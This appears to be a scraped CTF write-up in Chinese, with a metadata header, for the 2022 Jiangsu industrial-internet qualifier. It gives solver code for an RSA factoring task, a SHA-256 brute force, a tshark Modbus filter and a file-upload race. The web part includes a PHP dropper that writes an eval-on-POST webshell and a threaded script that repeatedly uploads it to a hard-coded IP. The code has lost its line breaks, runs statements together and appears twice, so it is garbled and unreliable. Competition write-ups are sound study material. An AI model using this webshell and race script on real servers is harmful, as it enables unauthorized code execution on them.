---
title: 中国工业互联网江苏省选拔赛 writeup
contest: 中国工业互联网
year: 2022
difficulty: medium
vuln_type: crypto_rsa
tags:
- RSA-Quadratic
- hash-sha256-brute
- modbus-pcap
- upload-race
- PHP-webshell
- quadratic-formula
- iroot
attack_chain:
- 'Crypto: RSA 二次方程求 p (p+q = 2^I + 31336), 用 iroot 求平方根'
- quadratic(1, -(2^I + 31336), n) 找 I ∈ [10, 2050]
- e = int('1'*I, 2) (e 是 2^I-1 形式), 找 e 满足 gcd(e,phi)!=1
- m = pow(c, d, n) 后开 g 次方根 (因为 e/g = d·m)
- 找到 m 中含 "flag" 输出
- 'Hash 爆破: num = ''86139'' + 8位数字, SHA256 = ''2704efd1382cb3c01cb7962e5b8b06d5dcbe427a61460fb333e126fb646dc108'
- '工控: tshark -r 1667353056652.pcapng -Y "ip.src==192.168.111.138 && modbus.func_code==6" 提取数据'
- 'Web: upload.php 竞争条件 + encode_multipart_formdata + 1.php 木马 ''<?php fputs(fopen("a.php","w"),"<?php @eval($_POST[1])?>"); ?>'
- '多线程 while 1: t=threading.Thread(a/b); t.start()'
key_payload: '''quadratic(1, -(2^I+31336), n) + int("1"*I, 2) + tshark modbus.func_code 6 + upload race'''
one_liner: 江苏省工控选拔赛 4 题：RSA 二次方程求 p + e=2^I-1 开方 + SHA256 8 位爆破 + modbus 流量 + upload 竞争条件。
lesson: 工控场景下 RSA 密码学 + pcap 流量 + 竞争条件上传 + Hash 爆破是常见组合。
quality: high
full_path: 中国工业互联网江苏省选拔赛writeup.full.md
meta_path: 中国工业互联网江苏省选拔赛writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '中国工业互联网江苏省选拔赛 writeup。江苏省工控选拔赛 4 题：RSA 二次方程求 p + e=2^I-1 开方 + SHA256 8 位爆破 + modbus 流量 + upload 竞争条件。。关键路径：Crypto: RSA 二次方程求 p (p+q = 2^I + 31336), 用 iroot 求平方根 → quadratic(1, -(2^I + 31336), n) 找 ...'
category: misc
subcategory: misc_other
tools_used:
- PHP
- tshark
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/73808.html
reasoning_chain:
- RSA 题目给 n,c 与 e 形如 sum=2^I+31336 → 触发点：n 的分解需要 e 还原
- 假设：n=pq 而 p+q=2^I+31336 接近 2^I → 动作：构造二次方程 quadratic(1,-(2^I+31336),n)
- 观察：iroot(b²-4ac,2) 返回整数 → 在 I∈[10,2050] 范围爆破得 p,q → 下一步：phi=(p-1)(q-1)
- 假设：e=int('1'*I,2) 是 2^I-1 形式 → 动作：遍历 I∈[1,50000] 求 GCD(e,phi)
- 观察：gcd>1 → d=inverse(e//g,phi) 解密 → 假设：m 被额外 g 次方处理 → 动作：iroot(m,g)
- 假设：爆破成功明文含 'flag{' → 动作：long_to_bytes(m) 检测 → 完成
- Hash 题 num='86139'+8 位 → SHA256 全文件匹配 → 10^8 字典足够拆 8 重 for
- modbus 工控题 ip.src==192.168.111.138 && modbus.func_code==6 → tshark -T fields 提 modbus.data
- 'Web upload race: encode_multipart_formdata 提交 1.php 木马 + 多线程 while 1: a()/b() 竞争'
failed_attempts:
- 试图直接标准 RSA 分解 n → 失败：n 是 2048 位大数
- 试图 fix I 值爆破 → 失败：I 未知需遍历 [10,2050]
- 试图单线程爆破 Hash → 失败：8 重 for 性能不够
key_observations:
- RSA 已知 e 形如 sum=2^I+K 时，构造 p+q 二次方程是快速分解法
- gmpy2.iroot 是 CTF Crypto 必会函数（开 g 次方 + 验证整除）
- '多线程 + while 1: t.start() 是 PHP 上传竞争条件经典模式'
- modbus.func_code==6 写寄存器是工控场景最常见数据通道
prerequisites:
- gmpy2 / Crypto.Util.number 大数运算
- RSA 模数分解与二次方程求解
- tshark 命令行过滤 modbus 协议
- Python threading 并发竞态利用
---
# 中国工业互联网江苏省选拔赛writeup

> 原文: https://www.ctfiot.com/73808.html
> ID: 73808

n = 8024564127973065791822696697071284794358778113244860389864422981119578975964727093926084927413648922361071020470150564725270618683354904686430544864634986421802250691574811643940493852040303365259871961829230451567976055242366978177493279020860227537560077272183489280971600541432160542487797473494437897108965642412346313867328843027097895335304551681879362719382890575460873246457441445622915378590294513103181807760404215667759122312502771211145132870220086702449210205047154398173087109995899654560082761774761002029827487645976212945576324039049642609852040160573026630219823125371936206527188545760503303196887c = 3180315760809674805307952038308070668830050176909147638772126511895314499221741418872541998973065111255595861696385202759844093540441475048944982758690063571599282883876643362851380191511250087221840725807404705385725070244402516934527422750911874245857588078974219707033577370635383250007806947507795729667764154840835200953651638272748044402141790503341924861185059671075139783417203879567804845438302056071839026625956697647771368487584705007737854745577029320506832583174617443045018932772363892102614493216452482474734088789707913499300956365998233734355238725491161615031776255737012637741880932940505976334292
from gmpy2 import iroot,invertfrom Crypto.Util.number import *
def quadratic(a,b,c): try: (d,t) = iroot(b*b - (4*a*c),2) if not t: return 0 return ((-b-d)//(2*a),(-b+d)//(2*a)) 
except: return 0
for I in range(10,2050): p_try = quadratic(1,-(2**I + 31336),n) if p_
try: print('nbit=,I') p = p_try[1] break
q = n//passert(isPrime(int(q)))assert(isPrime(int(p)))assert(n == p*q)print('p=',int(p))print('q=',int(q))for e in [int('1'*I,2) for I in range(1,50000)]: phi = (p-1)*(q-1) g = GCD(e,phi) if g == 1:
continue print('trying with e bits:',e.bit_length(),'gcd=',g) d = inverse(e//g,phi) m = pow(c,d,n) m,t = iroot(m,g) if not t:
continue flag = long_to_bytes(m) if b'flag' in flag: print(flag)        exit(0)

import hashlib
num = '86139'
ha = '2704efd1382cb3c01cb7962e5b8b06d5dcbe427a61460fb333e126fb646dc108'num1 = '0123456789'for i in num1: for ii in num1: for iii in num1: for iiii in num1: for iiiii in num1: for iiiiii in num1: for iiiiiii in num1: for iiiiiiii in num1: num2 = num + i + ii + iii + iiii + iiiii + iiiiii + iiiiiii + iiiiiiii hash1 = hashlib.sha256(num2.encode()).hexdigest() if hash1 == ha: print(num2) break

tshark -r 1667353056652.pcapng -T fields -e modbus.data -Y "ip.src == 192.168.111.138 && modbus.func_code == 6" >> fuck.txt

import requests
from urllib3 import encode_multipart_formdataimport threading
data = {'file': ('1.php', open('D:\phpstudy_pro\WWW\python有用脚本\1.php', 'rb').read(), 'image/jpeg')}encode_data = encode_multipart_formdata(data)
data = encode_data[0]
def a(): t1 = requests.post('http://222.186.10.28:
15668/upload.php', headers={ 'Content-Type': encode_data[1] }, data=data )def b(): t2 = requests.get("http://222.186.10.28:
15668/upload/1.php") print(t2.status_code)
while 1: t = threading.Thread(target=a, args='') t.start() t1 = threading.Thread(target=b, args='')t1.start()

//木马<?php fputs(fopen('a.php', 'w'), '<?php @eval($_POST[1])?>');?>


```
n = 8024564127973065791822696697071284794358778113244860389864422981119578975964727093926084927413648922361071020470150564725270618683354904686430544864634986421802250691574811643940493852040303365259871961829230451567976055242366978177493279020860227537560077272183489280971600541432160542487797473494437897108965642412346313867328843027097895335304551681879362719382890575460873246457441445622915378590294513103181807760404215667759122312502771211145132870220086702449210205047154398173087109995899654560082761774761002029827487645976212945576324039049642609852040160573026630219823125371936206527188545760503303196887c = 3180315760809674805307952038308070668830050176909147638772126511895314499221741418872541998973065111255595861696385202759844093540441475048944982758690063571599282883876643362851380191511250087221840725807404705385725070244402516934527422750911874245857588078974219707033577370635383250007806947507795729667764154840835200953651638272748044402141790503341924861185059671075139783417203879567804845438302056071839026625956697647771368487584705007737854745577029320506832583174617443045018932772363892102614493216452482474734088789707913499300956365998233734355238725491161615031776255737012637741880932940505976334292
from gmpy2 import iroot,invertfrom Crypto.Util.number import *
def quadratic(a,b,c): try: (d,t) = iroot(b*b - (4*a*c),2) if not t: return 0 return ((-b-d)//(2*a),(-b+d)//(2*a)) 
except: return 0
for I in range(10,2050): p_try = quadratic(1,-(2**I + 31336),n) if p_
try: print('nbit=,I') p = p_try[1] break
q = n//passert(isPrime(int(q)))assert(isPrime(int(p)))assert(n == p*q)print('p=',int(p))print('q=',int(q))for e in [int('1'*I,2) for I in range(1,50000)]: phi = (p-1)*(q-1) g = GCD(e,phi) if g == 1:
continue print('trying with e bits:',e.bit_length(),'gcd=',g) d = inverse(e//g,phi) m = pow(c,d,n) m,t = iroot(m,g) if not t:
continue flag = long_to_bytes(m) if b'flag' in flag: print(flag)        exit(0)
import hashlib
num = '86139'
ha = '2704efd1382cb3c01cb7962e5b8b06d5dcbe427a61460fb333e126fb646dc108'num1 = '0123456789'for i in num1: for ii in num1: for iii in num1: for iiii in num1: for iiiii in num1: for iiiiii in num1: for iiiiiii in num1: for iiiiiiii in num1: num2 = num + i + ii + iii + iiii + iiiii + iiiiii + iiiiiii + iiiiiiii hash1 = hashlib.sha256(num2.encode()).hexdigest() if hash1 == ha: print(num2) break
tshark -r 1667353056652.pcapng -T fields -e modbus.data -Y "ip.src == 192.168.111.138 && modbus.func_code == 6" >> fuck.txt
import requests
from urllib3 import encode_multipart_formdataimport threading
data = {'file': ('1.php', open('D:\phpstudy_pro\WWW\python有用脚本\1.php', 'rb').read(), 'image/jpeg')}encode_data = encode_multipart_formdata(data)
data = encode_data[0]
def a(): t1 = requests.post('http://222.186.10.28:
15668/upload.php', headers={ 'Content-Type': encode_data[1] }, data=data )def b(): t2 = requests.get("http://222.186.10.28:
15668/upload/1.php") print(t2.status_code)
while 1: t = threading.Thread(target=a, args='') t.start() t1 = threading.Thread(target=b, args='')t1.start()
//木马<?php fputs(fopen('a.php', 'w'), '<?php @eval($_POST[1])?>');?>
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]